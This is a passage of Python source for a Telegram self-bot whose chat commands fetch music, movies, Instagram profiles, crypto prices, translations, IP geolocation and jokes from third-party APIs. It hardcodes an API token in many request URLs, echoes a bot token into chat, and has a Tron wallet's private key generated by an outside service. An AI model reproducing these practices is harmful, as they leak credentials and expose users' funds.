    mm=json.dumps(img)
    mm1=json.loads(mm)
    a=mm1["id"]
    b=mm1["first_name"]
    c=mm1["username"]
    d=mm1["can_join_groups"]
    e=mm1["supports_inline_queries"]
    
    
    msg=f"**BOT-INFO**▬▬▬▬▬▬▬▬\n❖TOKEN = `{token}`\n\n**id = ** __{a}__\n\n**first_name = ** __{b}__\n\n**username = ** @{c}\n\n**can join groups = ** __{d}__\n\n**supports_inline_queries = ** __{e}__\n▬▬▬▬▬▬▬▬**BOT-INFO**"
    app.send_message(m.chat.id ,msg, reply_to_message_id=m.id)
  except Exception as er:
    app.send_message(m.chat.id ,f"خطايي رخ داد لطفا دوباره تلاش کنيد \n {er}", reply_to_message_id=m.id)
    
 elif text.startswith(".ci"):
  try:
    text = text.replace(".ci ", "")
    app.unblock_user("creationdatebot")
    response = app.send_message("creationdatebot" , f"/id {text}")
    sleep(3)
    spambot_msg = response.id + 1
    status = app.get_messages(chat_id="creationdatebot", message_ids=spambot_msg)
    app.send_message(m.chat.id, f"**STATUS**▬▬▬▬▬▬▬▬▬▬\nUser ID = `{text}`\nCreation Date = `{status.text}`\n▬▬▬▬▬▬▬▬▬▬**STATUS**", reply_to_message_id=m.id)
  except Exception as er:
    app.send_message(m.chat.id ,f"خطايي رخ داد لطفا دوباره تلاش کنيد \n {er}", reply_to_message_id=m.id)
    
 elif text.startswith(".com"):
  try:
    text = text.replace(".com ", "")
    app.unblock_user("rextesterrobot")
    response = app.send_message("rextesterrobot" , f"{text}")
    sleep(3)
    spambot_msg = response.id + 1
    status = app.get_messages(chat_id="rextesterrobot", message_ids=spambot_msg)
    app.send_message(m.chat.id, f"`{status.text}`", reply_to_message_id=m.id)
  except Exception as er:
    app.send_message(m.chat.id ,f"خطايي رخ داد لطفا دوباره تلاش کنيد \n {er}", reply_to_message_id=m.id)
#-----------------------music downloader---------------------
 elif text.startswith(".musicc "):
  try:
    text = text.replace(".musicc ", "")
    ytdl(text)
    app.send_audio(m.chat.id , f"{text}.mp3", ytinfo(text))
  except Exception as er:
    app.send_message(m.chat.id ,f"خطايي رخ داد لطفا دوباره تلاش کنيد \n {er}", reply_to_message_id=m.id)
#-----------------------------------------------------------------
 elif text.startswith(".remix "):
  try:
    name = text.replace(".remix ", "")
    wait = m.reply("Wait Please..")
    result = app.get_inline_bot_results("vkmusic_bot", name)
    if result.results:
        audio_result = result.results[0]
        gett = app.send_inline_bot_result("me", result.query_id, audio_result.id)
        music = app.get_messages("me", gett.updates[0].id)
        if music.audio:
            file_path = app.download_media(music.audio)
            wait.edit("**Downloaded**")
            app.delete_messages("me", gett.updates[0].id)
            m.reply_audio(file_path, caption=f"**Your Music is Ready!",performer="WenosSelf",title=f"{name}",thumb="cache/jack.jpg")
            os.remove(file_path)
        else:
            wait.edit("No audio found.")
            app.delete_messages("me", gett.updates[0].id)
    else:
        wait.edit("No music found.")
    wait.delete()
  except Exception as er:
    app.send_message(m.chat.id, f"An error occurred. Please try again.\n{er}", reply_to_message_id=m.id)
#------------------------------------------------------------------------
 elif text.startswith(".muzik "):
  try:
    name = text.replace(".muzik ", "")
    wait = m.reply("Wait Please..")
    result = app.get_inline_bot_results("vkrubot", name)
    if result.results:
        audio_result = result.results[0]
        gett = app.send_inline_bot_result("me", result.query_id, audio_result.id)
        music = app.get_messages("me", gett.updates[0].id)
        if music.audio:
            file_path = app.download_media(music.audio)
            wait.edit("**Downloaded**")
            app.delete_messages("me", gett.updates[0].id)
            m.reply_audio(file_path, caption=f"**Your Music is Ready!**\n__Music Name__ : **{name}**")
            os.remove(file_path)
        else:
            wait.edit("No audio found.")
            app.delete_messages("me", gett.updates[0].id)
    else:
        wait.edit("No music found.")
    wait.delete()
  except Exception as er:
    app.send_message(m.chat.id, f"An error occurred. Please try again.\n{er}", reply_to_message_id=m.id)
#-----------------------------------------------------------------------
 elif text.startswith(".global "):
  try:
    name = text.replace(".global ", "")
    wait = m.reply("Wait Please..")
    result = app.get_inline_bot_results("mixvk_bot", name)
    if result.results:
        audio_result = result.results[0]
        gett = app.send_inline_bot_result("me", result.query_id, audio_result.id)
        music = app.get_messages("me", gett.updates[0].id)
        if music.audio:
            file_path = app.download_media(music.audio)
            wait.edit("**Downloaded**")
            app.delete_messages("me", gett.updates[0].id)
            m.reply_audio(file_path, caption=f"**Your Music is Ready!",performer="WenosSelf",title=f"{name}",thumb="cache/jack.jpg")
            os.remove(file_path)
        else:
            wait.edit("No audio found.")
            app.delete_messages("me", gett.updates[0].id)
    else:
        wait.edit("No music found.")
    wait.delete()
  except Exception as er:
    app.send_message(m.chat.id, f"An error occurred. Please try again.\n{er}", reply_to_message_id=m.id)
#------------------------------------------------------------ 
 elif text.startswith(".demo "):
  try:
    name = text.replace(".demo ", "")
    wait = m.reply("__Wait Please..__")
    result = app.get_inline_bot_results("spotybot", name)
    if result.results:
        audio_result = result.results[0]
        gett = app.send_inline_bot_result("me", result.query_id, audio_result.id)
        music = app.get_messages("me", gett.updates[0].id)
        if music.audio:
            file_path = app.download_media(music.audio)
            wait.edit("**Downloaded**")
            app.delete_messages("me", gett.updates[0].id)
            m.reply_audio(file_path, caption=f"**Your Music is Ready!",performer="WenosSelf",title=f"{name}",thumb="cache/jack.jpg")
            os.remove(file_path)
        else:
            wait.edit("No audio found.")
            app.delete_messages("me", gett.updates[0].id)
    else:
        wait.edit("No music found.")
    wait.delete()
  except Exception as er:
    app.send_message(m.chat.id, f"An error occurred. Please try again.\n{er}", reply_to_message_id=m.id)
#-------------------------------------------------------------
 elif text.startswith(".music "):
    try:
        name = text.replace(".music ", "")
        wait = m.reply("**Please Wait...**")
        result = song_YouTube(name)
        wait.edit("**Downloaded**")
        app.send_photo(m.chat.id,result[2] , reply_to_message_id=m.id)
        m.reply_audio(result[0] , performer="WenosSelf", title=result[0], caption=result[1],thumb="cache/micon.jpg")
        os.remove(result[0])
        wait.delete()
    except Exception as er:
            app.send_message(m.chat.id, f"An error occurred. Please try again.\n{er}", reply_to_message_id=m.id)

#________________________________________________________________   
 elif text.startswith(".youtube "):
    try:
        name = text.replace(".youtube ", "")
        wait = m.reply(f"**Please Wait...**")
        result = get_youtube_video(name)
        if result[0]:
            app.send_photo(m.chat.id,result[1], caption=f"**WenosSelf**", reply_to_message_id=m.id)
            app.send_video(
                chat_id=m.chat.id,
                video=open(result[0], "rb"),
                reply_to_message_id=m.id,
                caption = f"**{result[2]}\nWenosSelf**"
            )
            os.remove(result[0])
            wait.delete()
        else:
            wait.edit("Error: Failed to get the video.")
    except Exception as e:
        app.send_message(
            m.chat.id,
            f"An error occurred. Please try again.\n{e}",
            reply_to_message_id=m.id,
        )
#__________________________________________________________________
 elif text.startswith(".classic "):
  try:
    name = text.replace(".classic ", "")
    wait = m.reply("Wait Please..")
    result = app.get_inline_bot_results("music", name)
    if result.results:
        audio_result = result.results[0]
        gett = app.send_inline_bot_result("me", result.query_id, audio_result.id)
        music = app.get_messages("me", gett.updates[0].id)
        if music.audio:
            file_path = app.download_media(music.audio)
            wait.edit("Downloaded")
            app.delete_messages("me", gett.updates[0].id)
            m.reply_audio(file_path, caption=f"**Your Music is Ready!",performer="WenosSelf",title=f"{name}",thumb="cache/jack.jpg")
            os.remove(file_path)
        else:
            wait.edit("No audio found.")
            app.delete_messages("me", gett.updates[0].id)
    else:
        wait.edit("No music found.")
    wait.delete()
  except Exception as er:
    app.send_message(m.chat.id, f"An error occurred. Please try again.\n{er}", reply_to_message_id=m.id)
 #-----------------------------------------------------------------   
 elif text.startswith(".musicc "):
  try:
    name = text.replace(".musicc ", "")
    wait = m.reply("Wait Please..")
    result = app.get_inline_bot_results("voiceshazambot", name)
    if result.results:
        audio_result = result.results[0]
        gett = app.send_inline_bot_result("me", result.query_id, audio_result.id)
        music = app.get_messages("me", gett.updates[0].id)
        if music.audio:
            file_path = app.download_media(music.audio)
            wait.edit("**Downloaded**")
            app.delete_messages("me", gett.updates[0].id)
            m.reply_audio(file_path, caption=f"**Your Music is Ready!",performer="WenosSelf",title=f"{name}",thumb="cache/jack.jpg")
            os.remove(file_path)
        else:
            wait.edit("No audio found.")
            app.delete_messages("me", gett.updates[0].id)
    else:
        wait.edit("No music found.")
    wait.delete()
  except Exception as er:
    app.send_message(m.chat.id, f"An error occurred. Please try again.\n{er}", reply_to_message_id=m.id)
#------------------------------------------------------------
 elif text.startswith(".ahang "):
  try:
    name = text.replace(".ahang ", "")
    download_song(name)
    app.send_audio(m.chat.id, open(f"{name}.mp3", "rb"),reply_to_message_id=m.id)
  except Exception as er:
    app.send_message(m.chat.id, f"خطايي رخ داد لطفا دوباره تلاش کنيد \n {er}", reply_to_message_id=m.id)
#------&&&&&--------------------------------------------------------------------
#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@


 elif text.startswith(".iginfo"):
  try:
    usernamee = text.replace(".iginfo ", "")
    info_response = make_get_request(f"https://one-api.ir/instagram/?token=257767:6565c68b902f2&action=user&username={usernamee}").json()
    caption = f"The {info_response['result']['username']} Info!\nID: {info_response['result']['username']}\nBio: {info_response['result']['bio']}\nName: {info_response['result']['full_name']}\nFollowers: {info_response['result']['followers']}\nFollowing: {info_response['result']['following']}\nPage: {info_response['result']['type']}\nPosts: {info_response['result']['posts']}"
    app.send_photo(m.chat.id, info_response['result']['profile'], caption=caption, reply_to_message_id=m.id)
  except Exception as er:
    app.send_message(m.chat.id, f"An error occurred. Please try again.\n{er}", reply_to_message_id=m.id)

 elif text.startswith(".igdl"):
  try:
    link = text.replace(".igdl ", "")
    wait = m.reply("Wait To Download")
    response = make_get_request(f"https://one-api.ir/instagram/?token=257767:6565c68b902f2&action=getall&link={link}&userinfo=false").json()
    dllink = response["result"]["media"]
    caption = response["result"]["caption"]
    wait.edit("Downloaded Uploading!")
    app.send_video(m.chat.id, dllink, caption=f"Your Media is Downloaded!\nCaption:\n{caption}", reply_to_message_id=m.id)
    wait.delete()
  except Exception as er:
    app.send_message(m.chat.id, f"An error occurred. Please try again.\n{er}", reply_to_message_id=m.id)
    
#------------------------------crypto------------------------

 elif text.startswith(".crypto "):
  try:
    text=text.replace('.crypto ','')
    url = f"https://api.nobitex.ir/market/stats?srcCurrency={text}&dstCurrency=irt,usdt"
    text = f"{text}-irt"
    response = requests.get(url)
    html_output = response.text
    mm1=json.loads(html_output)
    image = mm1["stats"][text]
    buy  = image['bestBuy']
    sell = image['bestSell']
    sood = image['dayChange']
    msg=f"▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n __❖ Name__ = **{text}** \n __خرید__ : **{buy}** ریال\nفروش : **{sell}** ریال\nتغییر قیمت : **{sood}** درصد\n▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n"
    app.send_message(m.chat.id ,msg, reply_to_message_id=m.id)
  except Exception as er:
    app.send_message(m.chat.id ,f"خطايي رخ داد لطفا دوباره تلاش کنيد \n {er}", reply_to_message_id=m.id)
#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
 elif text.startswith(".ma "):
  try:
    text = text.replace('.ma ', '')
    url = f"https://haji-api.ir/text-to-voice?text={text}&Character=FaridNeural"
    response = requests.get(url)
    app.delete_messages(m.chat.id, m.id)
    html_output = response.text
    mm1 = json.loads(html_output)
    audio = mm1["results"]["url"]
    app.send_audio(m.chat.id, audio, reply_to_message_id=m.id,title="man.mp3",performer="WenosSelf")
  except Exception as e:
    app.send_message(m.chat.id, f"خطایی رخ داد. لطفا دوباره تلاش کنید.\n{e}", reply_to_message_id=m.id)
    
 elif text.startswith(".wo "):
  try:
    text = text.replace('.wo ', '')
    url = f"https://haji-api.ir/text-to-voice?text={text}&Character=DilaraNeural"
    response = requests.get(url)
    app.delete_messages(m.chat.id, m.id)
    html_output = response.text
    mm1 = json.loads(html_output)
    audio = mm1["results"]["url"]
    app.send_audio(m.chat.id, audio, reply_to_message_id=m.id)
  except Exception as e:
    app.send_message(m.chat.id, f"خطایی رخ داد. لطفا دوباره تلاش کنید.\n{e}", reply_to_message_id=m.id)
    
 elif text.startswith(".ip "):
  try:
    text = text.replace('.ip ', '')
    url = f"http://ip-api.com/json/{text}"
    response = requests.get(url)
    data = response.json()
    location = f"**Query**: {text}\n**Country**: {data['country']}\n**Country_Code**: {data['countryCode']}\n**Region**: {data['region']}\n**RegionName**: {data['regionName']}\n**zip**: {data['zip']}\n**timezone**: {data['timezone']}\n**isp**: {data['isp']}\n**org**: {data['org']}\n**as**: {data['as']}\n**IP**: {data['query']}\n**City**: {data['city']}\n**Latitude**: {data['lat']}\n**Longitude**: {data['lon']}"
    app.send_message(m.chat.id, location, reply_to_message_id=m.id)
  except Exception as e:
    app.send_message(m.chat.id, f"خطایی رخ داد. لطفا دوباره تلاش کنید.\n{e}", reply_to_message_id=m.id)
  
#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
#---------------------------crypto list-----------------------
 elif text == ".cryptolist":
  try:
    msg="** ❖CRYPTO LIST(لیست نام ارزها)\n▬▬▬▬▬▬▬▬▬▬▬▬▬▬\nrls, btc, eth, ltc, usdt, xrp, bch, bnb, eos, xlm, etc, trx, pmn, doge, uni, dai, link, dot, aave, ada,shib, ftm, matic, axs, mana, sand, avax, mkr, gmt, usdc\n▬▬▬▬▬▬▬▬▬▬▬▬▬▬\nاز دستور .crypto name اطلاعات کامل هر ارز دیجیتال را دریافت کنید.**"
    app.send_message(m.chat.id ,msg, reply_to_message_id=m.id)
  except Exception as er:
    app.send_message(m.chat.id ,f"خطايي رخ داد لطفا دوباره تلاش کنيد \n {er}", reply_to_message_id=m.id)
#---------------------------translate en - fa --------------------------
 elif text.startswith(".fa "):
  try:
    text=text.replace('.fa ','')
    url = f"https://one-api.ir/translate/?token=257767:6565c68b902f2&action=google&lang=fa&q={text}"
    response = requests.get(url)
    html_output = response.text
    mm1=json.loads(html_output)
    image = mm1["result"]
    msg=f"__❖GOOGLE TRANSLATE__ \n▬▬▬▬▬▬▬▬▬▬▬▬▬▬\nترجمه به فارسی: **{image}** \n▬▬▬▬▬▬▬▬▬▬▬▬▬▬"
    app.send_message(m.chat.id ,msg, reply_to_message_id=m.id)
  except Exception as er:
    app.send_message(m.chat.id ,f"خطايي رخ داد لطفا دوباره تلاش کنيد \n {er}", reply_to_message_id=m.id)
    
 elif text.startswith(".en "):
  try:
    text=text.replace('.en ','')
    url = f"https://one-api.ir/translate/?token=257767:6565c68b902f2&action=google&lang=en&q={text}"
    response = requests.get(url)
    html_output = response.text
    mm1=json.loads(html_output)
    image = mm1["result"]
    msg=f"❖GOOGLE TRANSLATE\n▬▬▬▬▬▬▬▬▬▬▬▬▬▬\nTranslate to __English__ =  **{image}** \n▬▬▬▬▬▬▬▬▬▬▬▬▬▬"
    app.send_message(m.chat.id ,msg, reply_to_message_id=m.id)
  except Exception as er:
    app.send_message(m.chat.id ,f"خطايي رخ داد لطفا دوباره تلاش کنيد \n {er}", reply_to_message_id=m.id)
#-------------------------movie--------------------------------
 elif text.startswith(".mobo "):
  try:
    text=text.replace('.mobo ','')
    url = f"https://one-api.ir/mobomoviez/?token=257767:6565c68b902f2&action=search&q={text}&page=1"
    response = requests.get(url)
    html_output = response.text
    ms=json.loads(html_output)
    image = ms["result"]
    img=image[0]
    mm=json.dumps(img)
    mm1=json.loads(mm)
    title=mm1["title"]
    url=mm1["url"]
    poster=mm1["poster"]
    msg=f"__❖Title__ = **{title}** \n __❖Link__ = **{url}** \n▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n __poster__ =  **{poster}** \n▬▬▬▬▬▬▬▬▬▬▬▬▬▬"
    app.send_message(m.chat.id ,msg, reply_to_message_id=m.id)
  except Exception as er:
    app.send_message(m.chat.id ,f"خطايي رخ داد لطفا دوباره تلاش کنيد \n {er}", reply_to_message_id=m.id)
#---------------------------------------------------------------   
 elif text.startswith(".movie "):
  try:
    name=text.replace('.movie ','')
    m2 = m.reply("**Downloading..**")
    bot_results = app.get_inline_bot_results("tgmovies2bot" , name)
    video = app.send_inline_bot_result("me" , bot_results.query_id, bot_results.results[1].id)
    message_video = app.get_messages("me" , video.updates[0].id)
    m3 = m.reply("**Uploading..**")
    wait = m.reply("Wait Please..")
    wait.delete()
    app.send_document(m.chat.id , message_video.document.file_id, caption="**Your Movie is Ready !....**")
    m2.delete()
    m3.delete()
    app.delete_messages("me" , video.updates[0].id)
  except Exception as er:
    app.send_message(m.chat.id ,f"خطايي رخ داد لطفا دوباره تلاش کنيد \n {er}", reply_to_message_id=m.id)
#------------------------------------------------------------
 elif text.startswith(".movie2 "):
  try:
    name=text.replace('.movie2 ','')
    url = f"https://one-api.ir/mobomoviez/?token=257767:6565c68b902f2&action=search&q={name}&page=1"
    response = requests.get(url)
    html_output = response.text
    ms=json.loads(html_output)
    image = ms["result"]
    img=image[0]
    mm=json.dumps(img)
    mm1=json.loads(mm)
    title=mm1["title"]
    url=mm1["url"]
    poster=mm1["poster"]
    msg=f"▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n**__❖Title__ = **{title}** \n\n __❖Download Link__ = **{url}** \n\n __poster__ =  **{poster}** \n\n▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n👇👇👇Your Movie👇👇👇"
    m2 = m.reply("**Downloading..**")
    bot_results = app.get_inline_bot_results("fc_movierobot" , name)
    video = app.send_inline_bot_result("me" , bot_results.query_id, bot_results.results[1].id)
    message_video = app.get_messages("me" , video.updates[0].id)
    m3 = m.reply("**Uploading..**")
    wait = m.reply("Wait Please..")
    result = app.get_inline_bot_results("pic", name)
    m2.delete()
    m3.delete()
    if result.results:
        photo_result = result.results[0]
        gett = app.send_inline_bot_result("me", result.query_id, photo_result.id)
        image1 = app.get_messages("me", gett.updates[0].id)
        if image1.photo:
            file_path = app.download_media(image1.photo)
            wait.edit("**Downloaded**")
            app.delete_messages("me", gett.updates[0].id)
            m.reply_photo(file_path, caption=f"{msg}")
            os.remove(file_path)
        else:
            wait.edit("No Photo found.")
            app.delete_messages("me", gett.updates[0].id)
    else:
        wait.edit("No photo found.")
    wait.delete()
    app.send_document(m.chat.id , message_video.document.file_id, caption="**Your Movie is Ready !....**")
    m2.delete()
    m3.delete()
    app.delete_messages("me" , video.updates[0].id)
  except Exception as er:
    app.send_message(m.chat.id ,f"خطايي رخ داد لطفا دوباره تلاش کنيد \n {er}", reply_to_message_id=m.id)
#-------------------------name--------------------------------
 elif text.startswith(".name "):
  try:
    text=text.replace('.name ','')
    url = f"https://one-api.ir/dictionary/?token=257767:6565c68b902f2&action=names&q={text}"
    response = requests.get(url)
    html_output = response.text
    ms=json.loads(html_output)
    image = ms["result"]
    img=image[0]
    mm=json.dumps(img)
    mm1=json.loads(mm)
    name=mm1["name"]
    pronun=mm1["pronun"]
    gender=mm1["gender"]
    means=mm1["means"]
    num=mm1["id"]
    msg=f"\n▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n __❖Name__ = **{name}** \n __❖Pronun__ : **{pronun}** \n__❖Gender__ : **{gender}** \n__❖Means__= **{means}** \n ❖ID : {num}\n▬▬▬▬▬▬▬▬▬▬▬▬▬▬"
    app.send_message(m.chat.id ,msg, reply_to_message_id=m.id)
  except Exception as er:
    app.send_message(m.chat.id ,f"خطايي رخ داد لطفا دوباره تلاش کنيد \n {er}", reply_to_message_id=m.id)
#----------------oghat----------------------------------------
 elif text.startswith(".oqat "):
  try:
    text=text.replace('.oqat ','')
    url = f"https://api.codebazan.ir/owghat/?city={text}"
    response = requests.get(url)
    html_output = response.text
    ms=json.loads(html_output)
    image = ms["Result"]
    img=image[0]
    mm=json.dumps(img)
    mm1=json.loads(mm)
    shahr=mm1["shahr"]
    tarikh=mm1["tarikh"]
    azansobh=mm1["azansobh"]
    toloaftab=mm1["toloaftab"]
    azanzohr=mm1["azanzohr"]
    ghorubaftab=mm1["ghorubaftab"]
    azanmaghreb=mm1["azanmaghreb"]
    nimeshab=mm1["nimeshab"]
    msg=f"اوغات شرعي شهر {shahr} عبارت است از \nتاريخ امروز : {tarikh} \nاذان صبح : {azansobh} \nطلوع آفتاب : {toloaftab} \nاذان ظهر : {azanzohr} \nغروب آفتاب : {ghorubaftab} \n اذان مغرب : {azanmaghreb} \nنيمه شب شرعي : {nimeshab} \nاحتياط دودقيقه اي بهتر است رعايت شود"
    app.send_message(m.chat.id ,msg, reply_to_message_id=m.id)
  except Exception as er:
    app.send_message(m.chat.id ,f"خطايي رخ داد لطفا دوباره تلاش کنيد \n {er}", reply_to_message_id=m.id)
#--------------------------ping--------------------------
 elif text.startswith(".p "):
  try:
    text=text.replace('.p ','')  
    url = f"http://api.codebazan.ir/ping/?url={text}"
    response = requests.get(url)
    html_output = response.text
    msg=f"▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n __URL__ = **{text}** \n __Ping__ = **{html_output}** \n▬▬▬▬▬▬▬▬▬▬▬▬▬▬"
    app.send_message(m.chat.id ,msg, reply_to_message_id=m.id)
  except Exception as er:
    app.send_message(m.chat.id ,f"خطايي رخ داد لطفا دوباره تلاش کنيد \n {er}", reply_to_message_id=m.id)
#------------------------pass--------------------------
 elif text.startswith(".pass "):
  try:
    text=text.replace('.pass ','')  
    url = f'http://api.codebazan.ir/password/?length={text}'
    response = requests.get(url)
    html_output = response.text
    msg=f"▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n __PASSWORD IS READY__ = **{html_output}** \n __Length__ = **{text}** \n▬▬▬▬▬▬▬▬▬▬▬▬▬▬"
    app.send_message(m.chat.id ,msg, reply_to_message_id=m.id)
  except Exception as er:
    app.send_message(m.chat.id ,f"خطايي رخ داد لطفا دوباره تلاش کنيد \n {er}", reply_to_message_id=m.id)
#---------------------------morset----------------------
 elif text.startswith(".morset "):
  try:
    text=text.replace('.morset ','')  
    url = f'http://api.codebazan.ir/mourse/?lang=en&text={text}'
    response = requests.get(url)
    html_output = response.text
    msg=f"▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n __Morset code__ = **{html_output}** \n __YOUR TEXT__ = **{text}** \n▬▬▬▬▬▬▬▬▬▬▬▬▬▬"
    app.send_message(m.chat.id ,msg, reply_to_message_id=m.id)
  except Exception as er:
    app.send_message(m.chat.id ,f"خطايي رخ داد لطفا دوباره تلاش کنيد \n {er}", reply_to_message_id=m.id)
    
 elif text.startswith("مورس "):
  try:
    text=text.replace('مورس ','')  
    url = f'http://api.codebazan.ir/mourse/?lang=fa&text={text}'
    response = requests.get(url)
    html_output = response.text
    msg=f"▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n __مورس کد__ = **{html_output}** \n __متن شما__ = **{text}** \n▬▬▬▬▬▬▬▬▬▬▬▬▬▬"
    app.send_message(m.chat.id ,msg, reply_to_message_id=m.id)
  except Exception as er:
    app.send_message(m.chat.id ,f"خطايي رخ داد لطفا دوباره تلاش کنيد \n {er}", reply_to_message_id=m.id)

 elif text.startswith(".unmorset "):
  try:
    text=text.replace('.unmorset ','')  
    url = f'http://api.codebazan.ir/mourse/?lang=en&mourse={text}'
    response = requests.get(url)
    html_output = response.text
    msg=f"▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n __UNMorset code__ = **{html_output}** \n __YOUR Morset__ = **{text}** \n▬▬▬▬▬▬▬▬▬▬▬▬▬▬"
    app.send_message(m.chat.id ,msg, reply_to_message_id=m.id)
  except Exception as er:
    app.send_message(m.chat.id ,f"خطايي رخ داد لطفا دوباره تلاش کنيد \n {er}", reply_to_message_id=m.id)
    
 elif text.startswith("ان مورس "):
  try:
    text=text.replace('ان مورس ','')  
    url = f'http://api.codebazan.ir/mourse/?lang=fa&mourse={text}'
    response = requests.get(url)
    html_output = response.text
    msg=f"▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n __کد ان مورس__ = **{html_output}** \n __مورس شما__ = **{text}** \n▬▬▬▬▬▬▬▬▬▬▬▬▬▬"
    app.send_message(m.chat.id ,msg, reply_to_message_id=m.id)
  except Exception as er:
    app.send_message(m.chat.id ,f"خطايي رخ داد لطفا دوباره تلاش کنيد \n {er}", reply_to_message_id=m.id)
#---------------------screen---------------------------------
 elif text.startswith(".screenshot4"):
  try:
    response = requests.get(f"http://api.codebazan.ir/webshot/?text=1000x1000&domain=https://{text.replace('.screenshot4' , '')[1::]}")
    with open('screenshot.png', 'wb') as image_file:image_file.write(response.content)
    app.send_photo(m.chat.id, open('screenshot.png', 'rb'), reply_to_message_id=m.id)
    os.remove("screenshot.png")
  except Exception as er:
    app.send_message(m.chat.id ,f"خطايي رخ داد لطفا دوباره تلاش کنيد \n {er}", reply_to_message_id=m.id)
    
 elif text.startswith(".screenshot3"):
  try:
    app.send_message(m.chat.id ,f"**لطفا 10 ثانیه منتظر بمانید**", reply_to_message_id=m.id)
    response = requests.get(f"https://api.screenshotlayer.com/api/capture?access_key=x&url=https://{text.replace('.screenshot3' , '')[1::]}&viewport=1000x1000&force=1")
  except Exception as er:
    app.send_message(m.chat.id ,f"خطايي رخ داد لطفا دوباره تلاش کنيد \n {er}", reply_to_message_id=m.id)
#----------------today----------------------------------------
 elif text == "امروز" or text == ".date":
  try:
    url = f"https://api.codebazan.ir/owghat/?city=تهران"
    response = requests.get(url)
    html_output = response.text
    ms=json.loads(html_output)
    image = ms["Result"]
    img=image[0]
    mm=json.dumps(img)
    mm1=json.loads(mm)
    tarikh=mm1["tarikh"]
    msg=f"تاريخ امروز : {tarikh}"
    app.send_message(m.chat.id ,msg, reply_to_message_id=m.id)
  except Exception as er:
    app.send_message(m.chat.id ,f"خطايي رخ داد لطفا دوباره تلاش کنيد \n {er}", reply_to_message_id=m.id)
#ping----------------------

# دیگر قسمت‌های کد

 elif text == "ultraself" or text=="ultra" or text=="self" or text=="سلف" or text=="پینگ":
     ping = psutil.getloadavg()
     process = psutil.Process(os.getpid())
     ram = sizeof_fmt(process.memory_info().rss)
     app.send_message(m.chat.id, f"▬▬▬▬▬▬▬▬▬▬▬▬▬▬\nSELF is **ONLINE**\n▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n❅Ping: `%s` ms\n❅Ram: `%s`\n▬▬▬▬▬▬▬▬▬▬▬▬▬▬" % (ping[0], ram), reply_to_message_id=m.id)
#link-----------------------------
 elif text == (".link"):
    link = app.create_chat_invite_link(m.chat.id)
    app.send_message(m.chat.id,"❈**Link**: %s ." % link.invite_link,reply_to_message_id=m.id)
#----------------------------mini id----------------------------
 elif text == ("id"):
    dd="ايدي عددي شما : "+str(m.chat.id)
    app.send_message(m.chat.id ,dd,reply_to_message_id=m.id)
#-------------------pokht o paz------------------------
 elif text == ".cook" or text=="پخت و پز":
    url = f'http://mohammadali.kavir-host-sub.ir/api/cook.php'
    response = requests.get(url)
    html_output = response.text
    app.send_message(m.chat.id ,html_output, reply_to_message_id=m.id)
#--------------------bio--------------------------------
 elif text == ".bio" or text=="bio":
    url = f'https://api.codebazan.ir/bio'
    response = requests.get(url)
    html_output = response.text
    msg=f"▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n **{html_output}** \n▬▬▬▬▬▬▬▬▬▬▬▬▬▬"
    app.send_message(m.chat.id ,msg, reply_to_message_id=m.id)
#-----------------------khatere-------------------------
 elif text == ".memo" or text=="خاطره":
    url = f'http://api.codebazan.ir/jok/khatere'
    response = requests.get(url)
    html_output = response.text
    msg=f"▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n **{html_output}** \n▬▬▬▬▬▬▬▬▬▬▬▬▬▬"
    app.send_message(m.chat.id ,msg, reply_to_message_id=m.id)
#------------------------pnp------------------------------
 elif text == ".pnp" or text=="pnp":
    url = f'http://api.codebazan.ir/jok/pa-na-pa/'
    response = requests.get(url)
    html_output = response.text
    msg=f"▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n **{html_output}** \n▬▬▬▬▬▬▬▬▬▬▬▬▬▬"
    app.send_message(m.chat.id ,msg, reply_to_message_id=m.id)
#------------------------alaki---------------------------
 elif text == ".alaki" or text=="الکی":
    url = f'http://api.codebazan.ir/jok/alaki-masalan'
    response = requests.get(url)
    html_output = response.text
    msg=f"▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n **{html_output}** \n▬▬▬▬▬▬▬▬▬▬▬▬▬▬"
    app.send_message(m.chat.id ,msg, reply_to_message_id=m.id)
#-------------------------hadis--------------------------
 elif text == ".hadis" or text=="حدیث":
    url = f'http://api.codebazan.ir/hadis/'
    response = requests.get(url)
    html_output = response.text
    msg=f"▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n **{html_output}** \n▬▬▬▬▬▬▬▬▬▬▬▬▬▬"
    app.send_message(m.chat.id ,msg, reply_to_message_id=m.id)
#--------------------------dastan------------------------
 elif text == ".dastan" or text=="داستان":
    url = f'http://api.codebazan.ir/dastan/'
    response = requests.get(url)
    html_output = response.text
    msg=f"▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n **{html_output}** \n▬▬▬▬▬▬▬▬▬▬▬▬▬▬"
    app.send_message(m.chat.id ,msg, reply_to_message_id=m.id)
#--------------------------dialog-------------------------
 elif text == ".dlg" or text=="دیالوگ":
    url = f'http://api.codebazan.ir/dialog/'
    response = requests.get(url)
    html_output = response.text
    msg=f"▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n **{html_output}** \n▬▬▬▬▬▬▬▬▬▬▬▬▬▬"
    app.send_message(m.chat.id ,msg, reply_to_message_id=m.id)
 #-------------------------------------Pr
 elif text.startswith(".newTron"):
    url = f'https://api.picassocode.ir/Tron.php?key={apiKeyBot}&type=createAccount'
    response = requests.get(url)
    html_output = response.text
    gpt=json.loads(html_output)
    wal=gpt["address"]
    pkk=gpt["private_key"]
